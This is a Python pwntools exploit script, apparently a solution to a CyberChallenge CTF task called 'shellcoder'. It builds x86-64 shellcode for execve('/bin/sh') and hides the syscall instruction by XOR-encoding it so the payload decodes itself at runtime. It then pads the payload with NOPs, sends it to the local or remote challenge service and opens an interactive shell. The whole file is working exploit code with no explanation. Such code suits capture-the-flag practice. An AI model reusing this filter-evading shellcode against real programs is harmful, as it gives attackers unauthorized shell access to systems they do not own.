#!/usr/bin/env python3
from pwn import *

bin_name = "./shellcoder"
elf = context.binary = ELF(bin_name)
context.terminal = ('gnome-terminal', '-e')

def conn():
    if args.GDB:
        return gdb.debug(elf.path, gdbscript='b main\ncontinue\n')
    elif args.REMOTE:
        return remote("shellcoder.challs.cyberchallenge.it", 38201)
    else:
        return process(elf.path)

def main():
    r = conn()
    syscall = asm('syscall')
    bb = b'1'
    syscall = bytes([syscall[0] ^ bb[0]]) + bytes([syscall[1] ^ bb[0]])
    print(syscall)
    sys2 = bytes([syscall[0] ^ bb[0]]) + bytes([syscall[1] ^ bb[0]])
    print(sys2)
    payload = asm(f'''
        mov rax, 0x3b
        mov rdi,0xbeef00ca
        mov rsi,0
        mov rdx,0xbeef00c8
        xor byte ptr [rdx], 0x31
        xor byte ptr [rdx+1], 0x31
        mov rdx,0
                  ''')
    payload = payload.ljust(200,b'\x90')
    payload += syscall
    payload += b'/bin/sh\x00'
    print(payload)
    r.recv()
    r.sendline(b'210')
    r.recv()
    r.sendline(payload)
    r.interactive()

if __name__ == "__main__":
    main()
